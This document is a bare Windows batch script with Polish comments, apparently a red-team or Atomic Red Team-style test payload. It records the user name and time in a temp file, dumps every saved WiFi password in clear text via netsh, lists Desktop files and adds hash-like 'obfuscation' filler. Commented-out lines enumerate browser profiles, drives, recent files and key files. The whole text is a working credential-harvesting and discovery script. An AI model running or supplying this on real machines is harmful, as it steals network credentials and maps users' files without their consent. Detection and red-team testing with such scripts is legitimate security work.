cmd.exe /Q /c whoami 1> %TEMP%\w1.txt 2>%TEMP%\w2.txt

cmd /Q /c  echo %date%_%time%               1>> %TEMP%\w1.txt

REM Echo Odczytanie hasełWiFi
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear 1>> %TEMP%\w1.txt

REM ECHO usuniecie procesu Google Chrome
REM taskkill /f /im chrome.exe

ECHO Print FAVORITES / Desktop
REM dir /s /b %USERPROFILE%\Favorites >>1 %TEMP%\w1.txt
dir /s /b %USERPROFILE%\desktop >>1 %TEMP%\w1.txt

REM Echo Odczytanie wybranych danych Systeminfo
REM cmd /q /c systeminfo| findstr "Time"        1>> %TEMP%\w1.txt

echo 1>> %TEMP%\w1.txt
echo obfuscation text
echo 200ceb26807d6bf99fd6f4f0d1ca54d4       1>> %TEMP%\w1.txt
echo d41d8cd9 8f00b204 e9800998 ecf8427e    1>> %TEMP%\w1.txt
echo 5058f1af8388633f609cadb75a75dc9d       1>> %TEMP%\w1.txt
echo a61 05c 0a6 11Зb 41b08 f1209 50635 0279e 1>> %TEMP%\w1.txt
echo e2b8f1e11eb1eac046c7ca0bd9611c75         1>> %TEMP%\w1.txt
echo 21;30;70;64;331                               1>> %TEMP%\w1.txt
echo lt1735685999                                  1>> %TEMP%\w1.txt

REM get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\*.sqlite"
REM dir /s c:\ >> #{output_file}
REM dir /s "c:\Documents and Settings" >> #{output_file}
REM dir /s "c:\Program Files\" >> #{output_file}
REM dir "%systemdrive%\Users\*.*" >> #{output_file}
REM dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> #{output_file}
REM dir "%userprofile%\Desktop\*.*" >> #{output_file}
REM tree /F >> #{output_file}
REM dir c:\ /b /s .key | findstr /e .key
REM dir /a-d /s /r | findstr ":$DATA" >>#{output_file}

REM https://archive.ph/Dw7ih
REM https://archive.ph/jnHxY#selection-11031.0-11109.61
REM https://urlscan.io/search/#page.domain%3Abugiplaysec.com
REM https://github.com/redcanaryco/atomic-red-team
